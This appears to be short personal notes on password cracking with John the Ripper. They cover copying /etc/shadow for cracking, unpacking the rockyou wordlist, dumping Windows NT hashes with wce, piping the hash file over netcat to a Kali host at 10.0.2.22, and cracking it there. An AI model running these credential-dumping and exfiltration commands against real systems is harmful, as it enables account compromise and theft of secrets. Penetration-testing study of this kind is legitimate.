

## john
```
cp /etc/shadow phile.txt

cat phile.txt

john phile.txty

john --show phile.txt
```



```bash
sudo gunzip -c /usr/share/wordlists/rockyou.txt.gz › ~/rockyou.txt



```
## Use John in Kali
```
  # get hashed password in windows
  wce -l -o remhash.txt

  # in windows, pass the file to kali
  nc 10.0.2.22 60000 < remhash.txt

  # in kali, receive the file
  nc -l -p 60000 > remhash.txt

  # run john in kali
  john --format=NT --wordlist=/usr/share/john/password.lst remhash.txt
```
